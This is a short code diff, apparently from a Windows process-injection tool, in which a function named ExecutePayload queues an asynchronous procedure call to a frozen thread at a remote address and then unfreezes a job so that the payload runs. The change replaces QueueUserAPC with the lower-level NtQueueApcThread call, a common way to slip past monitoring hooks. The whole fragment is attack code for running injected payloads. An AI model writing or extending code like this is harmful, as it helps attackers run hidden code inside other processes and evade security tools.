@@ -13,7 +13,7 @@ void ExecutePayload(void* pRemoteAddress, const unsigned char* payload, SIZE_T p
     }
 
     DEBUG_PRINT("Queuing APC to frozen thread at %p", pRemoteAddress);
-    pfnQueueUserAPC((PAPCFUNC)pRemoteAddress, hTargetThread, (ULONG_PTR)NULL);
+    pfnNtQueueApcThread(hTargetThread, pRemoteAddress, NULL, NULL, NULL);
 
     DEBUG_PRINT("Unfreezing job to execute APC...");
     freezeInfo.FreezeOperation = 1;
